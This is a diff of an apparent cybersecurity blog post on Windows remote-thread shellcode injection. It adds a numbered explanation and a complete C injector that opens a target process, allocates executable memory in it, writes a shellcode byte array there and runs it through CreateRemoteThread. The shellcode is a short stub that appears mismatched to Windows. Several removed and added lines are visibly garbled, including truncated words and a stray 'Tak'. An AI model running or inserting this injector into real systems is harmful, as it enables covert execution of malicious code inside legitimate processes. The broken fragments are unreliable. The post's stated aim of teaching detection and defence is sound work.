@@ -35,18 +35,73 @@ To be concrete and concise, in this blog post we will only cover **Remote Thread
 
 Before delving into the code snippet, let's understand the purpose of each function used in the shellcode injection process and its significance within the attack:
 
-1. **Shellcode Payload**: Replace the `shellcode` array with your desired shellcode, encoded in hexadecimal format.
-2. **Memory Allocation**: The [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) function is used to allocate memory within the current process. We allocate memory with the `PAGE_EXECUTE_READWRITE` protection attribute to allow execution.
-3. **Write Payload:** The [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function is used to allocate me
+1.   **Opening the Target Process**: Use [`OpenProcess`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) to open a handle to the target process identified by its process ID.
     
-. **Shellcode Execution**: Cast the allocated memory to a function pointer and invoke it to execute the shellcode.
+2.   **Memory Allocation**: Use [`VirtualAllocEx`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) to allocate memory within the address space of the target process.
     
-. **Memory Deallocation**: Once execution is complete, free the allocated memory using `VirtualFre`
+3.   **Shellcode Injection**: Use [`WriteProcessMemory`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) to write the shellcode to the allocated memory within the target process.
+    
+4.   **Remote Thread Creation**: Use [`CreateRemoteThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) to create a remote thread in the target process, specifying the entry point as the allocated memory containing the shellcode.
+    
+5.   **Cleanup**: Close handles and release allocated memory after the execution of the remote thread.
+
 
 ```C
+#include <windows.h>
+#include <stdio.h>
 
-test
+// Shellcode payload
+unsigned char shellcode[] = "\x48\x31\xc0\x48\x83\xc0\x0b\x48\x89\xc2\x48\x31\xff\x0f\x05";
+
+int main()
+{
+    // Open the target process
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <TARGET_PROCESS_ID>); // Replace <TARGET_PROCESS_ID> with the process ID of the target process
+    if (hProcess == NULL) {
+        printf("Failed to open target process. Error code: %d\n", GetLastError());
+        return 1;
+    }
+
+    // Allocate memory within the target process
+    LPVOID pAllocatedMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (pAllocatedMemory == NULL) {
+        printf("Failed to allocate memory in target process. Error code: %d\n", GetLastError());
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    // Write the shellcode to the allocated memory in the target process
+    if (!WriteProcessMemory(hProcess, pAllocatedMemory, shellcode, sizeof(shellcode), NULL)) {
+        printf("Failed to write shellcode to target process. Error code: %d\n", GetLastError());
+        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    // Create a remote thread in the target process to execute the shellcode
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAllocatedMemory, NULL, 0, NULL);
+    if (hThread == NULL) {
+        printf("Failed to create remote thread. Error code: %d\n", GetLastError());
+        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    // Wait for the remote thread to terminate
+    WaitForSingleObject(hThread, INFINITE);
+
+    // Clean up
+    CloseHandle(hThread);
+    VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
+
+    return 0;
+}
+
 ```
-### Conclusion
+
+
+Tak
+# Conclusion
 
 Shellcode injection represents a formidable challenge in the realm of cybersecurity, enabling attackers to covertly execute malicious code within legitimate processes. Understanding the intricacies of shellcode injection, along with implementing robust detection and mitigation strategies, is essential for organizations to defend against this stealthy threat. By staying vigilant and adopting a multi-layered security approach, organizations can bolster their defenses and mitigate the risks posed by shellcode injection in today's dynamic threat landscape. Explore more insights into cybersecurity challenges and solutions in our ongoing series.
